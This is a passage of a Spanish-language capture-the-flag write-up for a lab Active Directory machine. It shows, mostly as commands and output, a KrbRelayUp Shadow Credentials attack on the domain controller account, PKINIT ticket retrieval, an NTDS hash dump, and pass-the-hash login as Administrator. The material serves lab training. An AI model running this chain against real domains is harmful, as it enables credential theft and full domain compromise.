+Intentando obtener CLSIDs con herramientas como [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) tampoco funciona, pero si usamos RunasCs para cambiar nuestro Logon Type a 9 (NewCredentials) y spawnear una cmd para intentar usar la herramienta, si que funciona
+
+{% highlight powershell %}
+C:\Users\winrm_user\Documents>powershell ./GetCLSID.ps1
+powershell ./GetCLSID.ps1
+
+Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation
+----           ---------     --------- --------      ----                                               ---------------
+HKCR                                   Registry      HKEY_CLASSES_ROOT                                                 
+Looking for CLSIDs
+Looking for APIDs
+Joining CLSIDs and APIDs
+
+PSPath            : Microsoft.PowerShell.Core\FileSystem::C:\Users\winrm_user\Documents\Windows_Server_2019_Standard
+PSParentPath      : Microsoft.PowerShell.Core\FileSystem::C:\Users\winrm_user\Documents
+PSChildName       : Windows_Server_2019_Standard
+PSDrive           : C
+PSProvider        : Microsoft.PowerShell.Core\FileSystem
+PSIsContainer     : True
+Name              : Windows_Server_2019_Standard
+FullName          : C:\Users\winrm_user\Documents\Windows_Server_2019_Standard
+Parent            : Documents
+Exists            : True
+Root              : C:\
+Extension         : 
+CreationTime      : 5/26/2023 9:46:42 PM
+CreationTimeUtc   : 5/27/2023 4:46:42 AM
+LastAccessTime    : 5/26/2023 9:46:42 PM
+LastAccessTimeUtc : 5/27/2023 4:46:42 AM
+LastWriteTime     : 5/26/2023 9:46:42 PM
+LastWriteTimeUtc  : 5/27/2023 4:46:42 AM
+Attributes        : Directory
+Mode              : d-----
+BaseName          : Windows_Server_2019_Standard
+Target            : {}
+LinkType          : 
+
+
+{% endhighlight %}
+
+Nos ha creado una carpeta con una lista de CLSIDs en texto plano y en formato CSV
+
+{% highlight powershell %}
+C:\Users\winrm_user\Documents\Windows_Server_2019_Standard>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 8C2C-D6F9
+
+ Directory of C:\Users\winrm_user\Documents\Windows_Server_2019_Standard
+
+05/26/2023  09:46 PM    <DIR>          .
+05/26/2023  09:46 PM    <DIR>          ..
+05/26/2023  09:46 PM             2,840 CLSID.list
+05/26/2023  09:46 PM             6,811 CLSIDs.csv
+               2 File(s)          9,651 bytes
+               2 Dir(s)   5,849,591,808 bytes free
+
+C:\Users\winrm_user\Documents\Windows_Server_2019_Standard>type CLSID.list
+type CLSID.list
+{D6015EC3-FA16-4813-9CA1-DA204574F5DA}
+{c980e4c2-c178-4572-935d-a8a429884806}
+{F01D6448-0959-4E38-B6F6-B6643D4558FE}
+{% endhighlight %}
+
+y si usamos uno de los CLSID que hemos obtenido... mágicamente funciona el KrbRelay que por defecto efecuta un ataque de Shadow Credentials contra la cuenta de computador principal. (En este caso es DC$)
+
+{% highlight powershell %}
+C:\Users\winrm_user\Documents>.\KrbRelayUp relay -d absolute.htb -m shadowcred -cls c980e4c2-c178-4572-935d-a8a429884806 -cn DC$
+.\KrbRelayUp relay -d absolute.htb -m shadowcred -cls c980e4c2-c178-4572-935d-a8a429884806 -cn DC$
+KrbRelayUp - Relaying you to SYSTEM
+
+
+[+] Rewriting function table
+[+] Rewriting PEB
+[+] Init COM server
+[+] Register COM server
+[+] Forcing SYSTEM authentication
+[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...
+[+] LDAP session established
+[+] Generating certificate
+[+] Certificate generated
+[+] Generating KeyCredential
+[+] KeyCredential generated with DeviceID 893e689b-eb2c-43c4-a3a1-514c5dbc19a3
+[+] KeyCredential added successfully
+[+] Run the spawn method for SYSTEM shell:
+    ./KrbRelayUp.exe spawn -m shadowcred -d absolute.htb -dc dc.absolute.htb -ce MIIKSAIBAzCCCgQGCSqGSIb3DQEHAaCCCfUEggnxMIIJ7TCCBhYGCSqGSIb3DQEHAaCCBgcEggYDMIIF/zCCBfsGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAgRbpVEYRChSgICB9AEggTYXpNcQNzykG/m4GqZrvKUxS9Rs+VkgvjjSf3ftNGC7QMr0o1XJCZ/Xx0zGM50qCTgroBA3Uz2ORi1OwMGG2oKArwBT8YY3WQxcSg4RFCBADLzO/RrhpR2SoB5DG8Wtt03/GFsi...
+{% endhighlight %}
+
+Puedes usar el comando que te dice para crear un servicio que se ejecutará como el usuario Administrador y especificarle el comando de tu preferencia, o puedes tomar todo el certificado codificado en base64 y pasárselo a la herramienta para obtener tickets a través de PKINIT. También puedes usar [Rubeus](https://github.com/GhostPack/Rubeus).
+
+{% highlight bash %}
+❯ getTGTPKINIT.py -cert-pfx a.pfx -pfx-pass "pX8#pV3=jP7#" absolute.htb/DC$ dc.ccache
+2023-05-27 01:11:57,091 minikerberos INFO     Loading certificate and key from file
+INFO:minikerberos:Loading certificate and key from file
+2023-05-27 01:11:57,111 minikerberos INFO     Requesting TGT
+INFO:minikerberos:Requesting TGT
+2023-05-27 01:12:09,778 minikerberos INFO     AS-REP encryption key (you might need this later):
+INFO:minikerberos:AS-REP encryption key (you might need this later):
+2023-05-27 01:12:09,778 minikerberos INFO     ac6d38cc826506e54f8377787c01650701c4d56b6eca49d58575273e93213831
+INFO:minikerberos:ac6d38cc826506e54f8377787c01650701c4d56b6eca49d58575273e93213831
+2023-05-27 01:12:09,781 minikerberos INFO     Saved TGT to file
+INFO:minikerberos:Saved TGT to file
+{% endhighlight %}
+
+Tenemos el control de la cuenta de computador principal, por lo que podemos dumpear el NTDS.
+
+{% highlight bash %}
+❯ cme smb dc.absolute.htb --use-kcache --ntds
+SMB         dc.absolute.htb 445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+SMB         dc.absolute.htb 445    DC               [+] absolute.htb\DC$ from ccache 
+SMB         dc.absolute.htb 445    DC               [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+SMB         dc.absolute.htb 445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         dc.absolute.htb 445    DC               Administrator\Administrator:500:aad3b435b51404eeaad3b435b51404ee:1f4********************************:::
+SMB         dc.absolute.htb 445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:3********************************:::
+SMB         dc.absolute.htb 445    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3********************************:::
+...
+SMB         dc.absolute.htb 445    DC               [+] Dumped 18 NTDS hashes to /home/vzon/.cme/logs/DC_dc.absolute.htb_2023-05-27_011845.ntds of which 17 were added to the database
+SMB         dc.absolute.htb 445    DC               [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         dc.absolute.htb 445    DC               [*] cat /home/vzon/.cme/logs/DC_dc.absolute.htb_2023-05-27_011845.ntds | grep -iv disabled | cut -d ':' -f1
+{% endhighlight %}
+
+Usando el hash NTLM del usuario Administrador ya nos deja autenticarnos como este
+
+{% highlight bash %}
+❯ getTGT.py -hashes "aad3b435b51404eeaad3b435b51404ee:1f4********************************" absolute.htb/Administrator
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Saving ticket in Administrator.ccache
+❯ export KRB5CCNAME=Administrator.ccache
+❯ evil-winrm -i dc.absolute.htb -r absolute.htb
+
+Evil-WinRM shell v3.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> 
+{% endhighlight %}
+
+Ya podemos tomar la última flag.
+
+{% highlight powershell %}
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        5/26/2023   8:32 AM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+01da7244de9d7b4817954f3047******
+{% endhighlight %}
+
+<h2>EXTRA</h2>
+
+El CLSID que utilizé para hacer funcionar el KrbRelay es uno de los que viene por defecto en Windows Server 2019 (c980e4c2-c178-4572-935d-a8a429884806). Es del servicio de la clase "AppReadiness", se encarga de preparar aplicaciones cuando se instalan.
+
+![CLSID](/assets/writeups/absolute/5.png)
+
+Existe un archivo de recovery de los roles del servidor en la carpeta del usuario Administrador.
+
+{% highlight powershell %}
+*Evil-WinRM* PS C:\Users\Administrator> type -TotalCount 100 DeploymentConfigTemplate.xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Collections.ObjectModel.Collection`1[[System.Management.Automation.PSObject, System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]]</T>
+      <T>System.Object</T>
+    </TN>
+    <LST>
+      <Obj RefId="1">
+        <TN RefId="1">
+          <T>Microsoft.Management.Infrastructure.CimInstance#ROOT/Microsoft/Windows/ServerManager/ServerComponent_RSAT_AD_PowerShell</T>
+          <T>Microsoft.Management.Infrastructure.CimInstance#ROOT/Microsoft/Windows/ServerManager/MSFT_ServerManagerServerComponentDescriptor</T>
+          <T>Microsoft.Management.Infrastructure.CimInstance#ServerComponent_RSAT_AD_PowerShell</T>
+          <T>Microsoft.Management.Infrastructure.CimInstance#MSFT_ServerManagerServerComponentDescriptor</T>
+          <T>Microsoft.Management.Infrastructure.CimInstance</T>
+          <T>System.Object</T>
+        </TN>
+        <ToString>ServerComponent_RSAT_AD_PowerShell</ToString>
+        <Props>
+          <S N="PSComputerName">WIN-U8D2AHK6S0T</S>
+...
+{% endhighlight %}
+
+Si preguntan porque la versión de impacket cambia en los comandos es porque tuve que instalar la versión 0.10.0 de dicha librería para usar el script `dacledit.py`, también deben incluir en el directorio de impacket un archivo nombrado [msada_guids.py](https://github.com/ShutdownRepo/impacket/blob/dacledit/impacket/msada_guids.py) para que el script funcione correctamente.
